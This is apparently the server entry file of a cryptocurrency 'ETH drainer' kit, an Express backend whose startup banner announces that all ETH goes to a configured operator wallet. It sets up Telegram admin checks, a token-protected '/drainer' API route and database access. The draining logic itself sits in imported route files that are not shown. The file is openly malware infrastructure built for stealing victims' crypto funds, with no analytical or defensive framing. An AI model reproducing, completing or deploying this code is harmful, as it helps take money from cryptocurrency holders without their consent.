import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import { PrismaClient } from '@prisma/client';
import mainRoutes from './routes/main.route.js';
import userRoutes from './routes/user.route.js';
import adminRoutes from './routes/admin.route.js';
import { setupMiddleware } from './utils/Middleware.js';
import { 
  MS_Enable_API, 
  MS_API_Token, 
  MS_Protection, 
  MS_Telegram_Admin_IDs, 
  MS_Wallet_Address 
} from './utils/Utilite.js';

const app = express();
const prisma = new PrismaClient();

app.use(cors({ origin: process.env.CLIENT_URL || 'http://localhost:5173' }));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

if (MS_Protection) {
  setupMiddleware(app, prisma);
}

// Admin header check
app.use('/admin', (req, res, next) => {
  const adminId = req.headers['x-admin-id'];
  if (!MS_Telegram_Admin_IDs.includes(Number(adminId))) {
    return res.status(401).json({ error: 'Admin only' });
  }
  next();
});

// Routes
app.use('/api', mainRoutes);
app.use('/user', userRoutes);
app.use('/admin', adminRoutes);

// Optional API drainer
if (MS_Enable_API) {
  app.use('/drainer', (req, res, next) => {
    if (req.headers.authorization !== `Bearer ${MS_API_Token}`) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
  }, mainRoutes);
}

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`\n============================================================================================`);
  console.log(`===================== Your Full ETH Drainer (No Splits) ====================================`);
  console.log(`============================================================================================\n`);
  console.log(`All ETH to ${MS_Wallet_Address} on port ${PORT}`);
});

// Graceful shutdown
process.on('SIGINT', async () => {
  await prisma.$disconnect();
  process.exit();
});

export default app;
